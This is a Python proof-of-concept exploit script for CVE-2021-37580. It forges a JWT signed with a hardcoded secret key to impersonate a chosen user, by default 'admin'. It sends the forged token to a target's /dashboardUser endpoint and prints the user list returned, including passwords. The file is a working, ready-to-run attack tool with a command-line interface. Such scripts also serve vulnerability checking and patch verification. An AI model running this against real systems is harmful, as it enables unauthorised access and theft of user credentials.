#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Date    : 2021-11-17 20:40:04
# @Author  : 江南小虫虫 (fwh13612265462@gmail.com)
# @Link    : https://fengwenhua.top
import jwt
import time
import requests
import json
import sys
import argparse
requests.packages.urllib3.disable_warnings()

# python3 -m pip uninstall jwt
# python3 -m pip uninstall pyjwt
# python3 -m pip install pyjwt==1.5.3 --user


def generateToken(username):
    headers = {
        "alg": "HS256",
        "typ": "JWT"
    }
    # 设置headers，即加密算法的配置
    salt = "2095132720951327"
    # 随机的salt密钥，只有token生成者（同时也是校验者）自己能有，用于校验生成的token是否合法
    exp = int(time.time())
    # 设置超时时间：当前时间的100s以后超时
    payload = {
        "userName": username,
        "exp": exp
    }
    # 配置主体信息，一般是登录成功的用户之类的，因为jwt的主体信息很容易被解码，所以不要放敏感信息
    # 当然也可以将敏感信息加密后再放进payload

    token = jwt.encode(payload=payload, key=salt,
                       algorithm='HS256', headers=headers).decode('utf-8')
    # 生成token
    # print(token)
    return token


def poc(host, username):
    url = host + '/dashboardUser'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0',
        'X-Access-Token': generateToken(username)
    }
    r = requests.get(url, headers=headers, verify=False)
    result = r.text
    # print(result)
    if r.status_code == 200 and 'password' in result:
        dataList = json.loads(result)['data']['dataList']
        print('{} is VUL!! '.format(host))
        print(dataList)
    else:
        print('{} is NO VUL'.format(host))


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print("Usage: python3 CVE-2021-37580.py -u url -n 用户名")
        sys.exit()
    parser = argparse.ArgumentParser(
        description='CVE-2021-37580 poc工具')
    parser.add_argument('-u', '--url', help='指定单个url')
    parser.add_argument('-n', '--name', default='admin', help='指定用户名')
    args = parser.parse_args()

    target = args.url
    username = args.name

    if target:
        poc(target, username)
